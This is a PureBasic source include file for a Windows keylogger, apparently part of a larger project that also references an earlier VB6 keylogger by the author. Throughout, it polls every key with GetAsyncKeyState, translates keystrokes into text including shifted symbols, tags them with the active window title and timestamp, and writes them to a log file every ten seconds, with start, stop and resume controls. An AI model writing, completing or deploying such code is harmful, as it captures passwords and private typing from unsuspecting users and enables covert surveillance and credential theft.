;key logging include file
XIncludeFile "configreader.pbi"
XIncludeFile "datetime.pbi"
EnableExplicit

Global keylogThreadTerminateFlag.i

Declare.i IsCapslockOn()
Declare.i IsShiftPressed()
Declare.s GetString(vkCode.i)
Declare.i WasLastPressed(vkCode.i,Array lastPressed.i(1))
Declare.i GetRepeatTimePeriod(vkCode.i)

Procedure keyLogThread(*_)
  Define vkCode.i,retval.i,vkString.s
  Define buffer.s
  Define lastTick.q,currentTick.q
  Define lastVkCode.i ;for preventing too fast a key capture
  Define currentCaptureTick.q,lastCaptureTick.q
  Define writeEveryMs=10000; writes log to file every this many miliseconds
  Dim currentPressedKeys.i(20):Dim lastPressedKeys.i(20) ;records keys pressed at a time simultaneously
  Define i.i
  Define currentWindow.i,lastWindow.i,titleLength.i,windowTitle.s
  
  While Not keylogThreadTerminateFlag
    
    ;initialize pressed keys array to 0 i.e. no key pressed
    For i=1 To 20
      currentPressedKeys(i)=0  
    Next i
    i=1
    
    
    For vkCode=1 To $FE ;loop through all virtual key codes. https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
      If vkcode=$C: Continue:EndIf ;this key keeps being triggered if RSHIFT + Numpad5 is pressed. dunno why.
      retval=GetAsyncKeyState_(vkCode)
      If retval & $8000 > 0 ;if this key is being pressed
        currentPressedKeys(i)=vkCode:i=i+1 ;add currently pressed key to record
        currentCaptureTick=ElapsedMilliseconds()
        If WasLastPressed(vkCode,lastPressedKeys()) ;checks if current key was among the ones pressed in the previous iteration
          If currentCaptureTick-lastCaptureTick<GetRepeatTimePeriod(vkCode) ;if consecutive presses faster than allowable, don't record this key.
            Continue ;skip to next For iteration
          EndIf
        EndIf
        lastCaptureTick=currentCaptureTick
        lastVkCode=vkCode
        ;Debug GetString(vkCode)
        CompilerIf #True ;records window title when window changed. ignore the compilerIf. used for folding the code
        currentWindow=GetForegroundWindow_()
        If currentwindow<>lastWindow And GetString(vkCode)<>""
          lastWindow=currentWindow
          titleLength=GetWindowTextLength_(currentWindow)+1
          windowTitle=Space(titleLength)
          GetWindowText_(currentWindow,@windowTitle,titleLength)
          If Trim(windowTitle)<>""
            buffer=buffer+#CRLF$+#CRLF$+"[["+windowTitle+"]]"+#CRLF$+"["+GetDateTime()+"]"+#CRLF$+#CRLF$
          EndIf
        EndIf
        CompilerEndIf 
        buffer=buffer+GetString(vkCode)
      EndIf
    Next vkCode
    
    
    ;write recorded keys to file
    currentTick=ElapsedMilliseconds()
    If currentTick-lastTick>writeEveryMs
      lastTick=currentTick
      If buffer<>""
        saveKeyLogfile(buffer)
        buffer=""
      EndIf
    EndIf
    
    
    CopyArray(currentPressedKeys(), lastPressedKeys()) ;update last keys pressed record
    
    Delay(10) ;this short delay does not affect the repetition frequency of letters. that logic is in the For loop above
    
  Wend
  
EndProcedure

Procedure.i WasLastPressed(vkCode.i,Array lastPressed.i(1))
  Define i.i
  For i=1 To ArraySize(lastPressed())
    If vkCode=lastPressed(i)
      ProcedureReturn #True
    EndIf
  Next i
EndProcedure

Procedure.i GetRepeatTimePeriod(vkCode.i)
  ;decides the allowable time period of repetition for the given vkCode. will be higher for long-press keys(CTRL,ALT,etc) and shorter for others.
  ;repeats within this amount of milliseconds is disallowed
  ;these values are not set in stone. just my preference.
  Define retval.i
  Select vkCode
    Case #VK_CONTROL,#VK_MENU,#VK_UP,#VK_DOWN,#VK_LEFT,#VK_RIGHT,#VK_LWIN,#VK_RWIN
      retval=4000
    Case #VK_F1 To #VK_F24
      retval=2000
    Default
      retval=300
  EndSelect
  ProcedureReturn retval
EndProcedure


Procedure.s GetString(vkCode.i)
  Select vkCode
    Case #VK_A To #VK_Z ;alphabets are always recorded as capital    
      If IsCapslockOn() ! IsShiftPressed() ;if exactly one of caps lock or shift is enabled(XOR)
        ProcedureReturn Chr(vkCode)         
      Else
        ProcedureReturn Chr(vkCode+32)         ;converted to small letters
      EndIf
    Case #VK_0 To #VK_9 ;keyboard-top digits
      If IsShiftPressed()
        Select vkCode
          Case #VK_0
            ProcedureReturn ")"
          Case #VK_1
            ProcedureReturn "!"
          Case #VK_2
            ProcedureReturn "@"
          Case #VK_3
            ProcedureReturn "#"
          Case #VK_4
            ProcedureReturn "$"
          Case #VK_5
            ProcedureReturn "%"
          Case #VK_6
            ProcedureReturn "^"
          Case #VK_7
            ProcedureReturn "&"
          Case #VK_8
            ProcedureReturn "*"
          Case #VK_9
            ProcedureReturn "("
        EndSelect
      Else
        ProcedureReturn Chr(vkCode)  
      EndIf
    Case #VK_SPACE
      ProcedureReturn Chr(vkCode)
    Case #VK_TAB
      ProcedureReturn "[TAB]"
    Case #VK_NUMPAD0 To #VK_NUMPAD9
      ProcedureReturn Chr(vkcode-48)  ;vkcode of numpad number = vkcode of normal number + 48
    Case #VK_ADD ;numpad plus key
      ProcedureReturn "+"
    Case #VK_SUBTRACT ;numpad minus key
      ProcedureReturn "-"
    Case #VK_MULTIPLY ;numpad asterisk key
      ProcedureReturn "*"
    Case #VK_DIVIDE ;numpad divide key
      ProcedureReturn "/"
    Case #VK_DECIMAL ;numpad decimal key
      ProcedureReturn "."
    Case #VK_BACK
      ProcedureReturn "[BKSPC]"
    Case #VK_RETURN
      ProcedureReturn "[ENTER]"
    Case #VK_ESCAPE
      ProcedureReturn "[ESC]"
    Case #VK_PRIOR
      ProcedureReturn "[PGUP]"
    Case #VK_NEXT
      ProcedureReturn "[PGDN]"
    Case #VK_END
      ProcedureReturn "[END]"
    Case #VK_HOME
      ProcedureReturn "[HOME]"
    Case #VK_INSERT
      ProcedureReturn "[INS]"
    Case #VK_DELETE
      ProcedureReturn "[DEL]"
    Case #VK_OEM_PLUS ;keyboard-top plus
      If IsShiftPressed()
        ProcedureReturn "+"
      Else
        ProcedureReturn "="
      EndIf
    Case #VK_OEM_MINUS ;keyboard-top minus
      If IsShiftPressed()
        ProcedureReturn "_"
      Else
        ProcedureReturn "-"
      EndIf
    Case #VK_OEM_COMMA
      If IsShiftPressed()
        ProcedureReturn "<"
      Else
        ProcedureReturn ","
      EndIf
    Case #VK_OEM_PERIOD
      If IsShiftPressed()
        ProcedureReturn ">"
      Else
        ProcedureReturn "."
      EndIf
    Case #VK_OEM_1
      If IsShiftPressed()
        ProcedureReturn ":"
      Else
        ProcedureReturn ";"
      EndIf
    Case #VK_OEM_2
      If IsShiftPressed()
        ProcedureReturn "?"
      Else
        ProcedureReturn "/"
      EndIf
    Case #VK_OEM_3
      If IsShiftPressed()
        ProcedureReturn "~"
      Else
        ProcedureReturn "`"
      EndIf
    Case #VK_OEM_4
      If IsShiftPressed()
        ProcedureReturn "{"
      Else
        ProcedureReturn "["
      EndIf
    Case #VK_OEM_5
      If IsShiftPressed()
        ProcedureReturn "|"
      Else
        ProcedureReturn "\"
      EndIf
    Case #VK_OEM_6
      If IsShiftPressed()
        ProcedureReturn "}"
      Else
        ProcedureReturn "]"
      EndIf
    Case #VK_OEM_7
      If IsShiftPressed()
        ProcedureReturn #DOUBLEQUOTE$
      Else
        ProcedureReturn "'"
      EndIf
    Case #VK_F1 To #VK_F24  
      ProcedureReturn "[F"+Str(1+vkcode-#VK_F1)+"]"
    Case #VK_SNAPSHOT
      ProcedureReturn "[PSCN]"
    Case #VK_UP
      ProcedureReturn "[UP]"
    Case #VK_DOWN
      ProcedureReturn "[DOWN]"
    Case #VK_LEFT
      ProcedureReturn "[LEFT]"
    Case #VK_RIGHT
      ProcedureReturn "[RIGHT]"
    Case #VK_CONTROL
      ProcedureReturn "[CTRL]"
    Case #VK_MENU
      ProcedureReturn "[ALT]"
    Case #VK_LWIN
      ProcedureReturn "[LWIN]"
    Case #VK_RWIN
      ProcedureReturn "[RWIN]"
  EndSelect
  
EndProcedure


Procedure.i IsCapslockOn()
  Define keyState.c,LSB.i
  keyState=GetKeyState_(#VK_CAPITAL)
  LSB=keyState & 1
  ProcedureReturn LSB
EndProcedure

Procedure.i IsShiftPressed()
  Define keyState.c,state.i
  keystate=GetAsyncKeyState_(#VK_SHIFT) ;works for both LSHIFT and RSHIFT
  state=keystate & $8000
  ProcedureReturn state
EndProcedure


Procedure doKeyLogging()
  ;starts keylogging thread if thread not present
  ;do nothing if thread present
  
  Static thread   ;persistent variable over function calls due to Static keyword
  If Not IsThread(thread)
    thread=CreateThread(@keylogThread(),0)
  EndIf
EndProcedure

Procedure stopKeylogging()
  keylogThreadTerminateFlag=#True  
EndProcedure

Procedure resumeKeylogging()
  keylogThreadTerminateFlag=#False  
EndProcedure




;references
;https://www.codeproject.com/Messages/3410698/GetAsyncKeyState-and-GetKeyState-Solved.aspx
;sKeylogger (a VB6 project I did in 2015)
; IDE Options = PureBasic 5.70 LTS (Windows - x86)
; CursorPosition = 55
; FirstLine = 45
; Folding = --
; EnableAsm
; EnableThread
; EnableXP
; EnablePurifier